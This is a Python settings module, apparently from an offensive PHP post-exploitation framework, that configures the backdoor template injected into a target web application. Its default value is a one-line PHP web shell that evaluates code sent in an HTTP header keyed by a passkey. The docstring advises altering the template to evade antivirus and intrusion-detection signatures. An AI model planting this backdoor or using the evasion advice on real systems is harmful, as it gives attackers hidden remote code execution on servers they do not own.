"""
This setting allows overriding default backdoor template.
It is used to generate the backdoor to be injected in TARGET url.

This setting can be changed to improve stealth. Using a different
template than the default one is a good was to bypass static
Antivirus/IDS signatures.

Make sure that the global behavior remains the same.
Indeed, BACKDOOR must evaluate the content of 'HTTP_%%PASSKEY%%'
header to work properly.

NOTE: %%PASSKEY%% is a magic string that is replaced by PASSKEY
      value at runtime.

* Only edit BACKDOOR if you really understand what you're doing
"""
import linebuf
import datatypes


linebuf_type = linebuf.RandLineBuffer


def validator(value):
    if value.find("%%PASSKEY%%") < 0:
        raise ValueError("shall contain %%PASSKEY%% string")
    return datatypes.PhpCode(value)


def default_value():
    return("@eval($_SERVER['HTTP_%%PASSKEY%%']);")
